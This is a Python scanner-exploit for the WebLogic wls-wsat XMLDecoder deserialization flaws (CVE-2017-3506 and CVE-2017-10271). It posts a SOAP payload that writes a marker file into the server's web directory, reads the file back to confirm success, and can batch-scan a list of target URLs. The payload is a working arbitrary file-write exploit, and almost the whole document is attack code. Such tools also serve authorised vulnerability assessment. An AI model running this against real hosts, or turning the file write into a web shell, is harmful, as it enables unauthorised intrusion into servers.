import requests
from datetime import datetime
import re
import sys
import time  # time 모듈 추가

class Payload:
    url = None
    conn = None
    out = None
    in_ = None
    result = None
    line = None
    overTime = 6000
    verificationAddress = "/wls-wsat/cve.logs"
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"

    def pluginInfo(self):
        name = "WebLogic wls-wsat"
        cveId = "CVE-2017-3506 & CVE-2017-10271"
        grade = ""
        time_ = "2018/1/20"
        author = "Bearcat"

    @staticmethod
    def upload(host, type_):
        if type_ == 0:
            host = f"{host}/wls-wsat/CoordinatorPortType11"
        Identification = "yes"
        payload = f"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><object class=\"java.io.PrintWriter\"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/cve.logs</string><void method=\"println\"><string>{Identification}</string></void><void method=\"close\"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>"
        try:
            Payload.url = host
            Payload.conn = requests.post(host, data=payload, headers={"User-Agent": Payload.userAgent, "Content-Type": "text/xml", "Upgrade-Insecure-Requests": "1"}, timeout=Payload.overTime)
            Payload.in_ = Payload.conn.text
        except Exception:
            pass

    @staticmethod
    def testing(host):
        hosts = host
        host = f"{host}/wls-wsat/cve.logs"
        try:
            Payload.url = host
            Payload.conn = requests.get(host, headers={"User-Agent": Payload.userAgent}, timeout=Payload.overTime)
            Payload.result = Payload.conn.text.strip()
            if Payload.result == "yes":
                # 슬래시 중복 제거
                host = host.replace('//', '/')
                return f"    {datetime.now().strftime('%H:%M:%S')}     |\t    [+] success         | {host}\n+----------------+------------------------------+-----------------------------------------------------------------+"  # 성공 메시지만 반환
            else:
                return f"    {datetime.now().strftime('%H:%M:%S')}     |\t    [-] fail        | {hosts}\n+----------------+------------------------------+-----------------------------------------------------------------+"
        except Exception:
            return f"    {datetime.now().strftime('%H:%M:%S')}     |\t    [-] fail2           | {hosts}\n+----------------+------------------------------+-----------------------------------------------------------------+"

class TargetRecognition:
    in_ = None
    readHost = None
    connection = None
    sb = None
    line = None
    type = 1
    wls_Wsat = ["/wls-wsat/CoordinatorPortType", 
                "/wls-wsat/CoordinatorPortType11", 
                "/wls-wsat/ParticipantPortType", 
                "/wls-wsat/ParticipantPortType11", 
                "/wls-wsat/RegistrationPortTypeRPC", 
                "/wls-wsat/RegistrationPortTypeRPC11", 
                "/wls-wsat/RegistrationRequesterPortType", 
                "/wls-wsat/RegistrationRequesterPortType11"]

    @staticmethod
    def init(host):
        path = 0
        if path < len(TargetRecognition.wls_Wsat):
            if TargetRecognition.urlIdentification(host, TargetRecognition.wls_Wsat[path]):
                Payload.upload(f"{host}{TargetRecognition.wls_Wsat[path]}", 1)
                time.sleep(1)
                print(Payload.testing(host))
            else:
                print(f"|    {datetime.now().strftime('%H:%M:%S')}    |\t[!]      | {host}")
                print("+----------------+------------------------------+-----------------------------------------------------------------+")

    @staticmethod
    def urlIdentification(host, wls_Wsat_Path):
        host = f"{host}{wls_Wsat_Path}"
        try:
            TargetRecognition.readHost = host
            TargetRecognition.connection = requests.get(host, headers={"accept": "*/*", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"}, timeout=5000)
            TargetRecognition.sb = TargetRecognition.connection.text
            return TargetRecognition.regularExpressionJudgment(TargetRecognition.sb)
        except Exception:
            return False

    @staticmethod
    def regularExpressionJudgment(sb):
        pattern = ".*?(?i)wsdl</a></td></tr><tr><td>.*"
        pageKey = re.match(pattern, sb)
        return pageKey

class UrlBatch:
    filePath = None
    read = None
    file = None

    def __init__(self, filePath):
        print("\n[*]   [{}]\n".format(self.getUrlLines(filePath)))
        self.batchDetectionUrlList(filePath)

    @staticmethod
    def batchDetectionUrlList(filePath):
        UrlBatch.file = open(filePath, 'r')
        print("+----------------+------------------------------+-----------------------------------------------------------------+")
        print("      Time       |             Status           |                                Host                             ")
        print("+----------------+------------------------------+-----------------------------------------------------------------+")
        for host in UrlBatch.file.readlines():
            # URL의 마지막에 '/'가 있는 경우 이를 제거
            host = host.rstrip('/')
            # 각 URL에 대해 -u 옵션을 사용하여 실행
            Batch.main(["-u", host.strip()])
        print("\n[*] \n")

    @staticmethod
    def getUrlLines(filePath):
        UrlBatch.file = open(filePath, 'r')
        line = sum(1 for _ in UrlBatch.file)
        return line

class Batch:
    type = 0

    @staticmethod
    def main(args):
        if len(args) <= 0:
            print("\n                        WebLogic wls-wsat\n")
            print("[*]           CVE-2017-3506 & CVE-2017-10271")
            print("[*]     Original maker: Bearcat@secfree.com")
            print("[*]     Modify: JongChan@KBbank")
            print("\n[*] ")
            print("[*]           -f url.txt\n\n")
        elif args[0] == "-u":
            host = args[1]
            Payload.upload(host, 0)
            print(Payload.testing(host))
        elif args[0] == "-f":
            filePath = args[1]
            urlBatch = UrlBatch(filePath)
            pass

if __name__ == "__main__":
    Batch.main(sys.argv[1:])


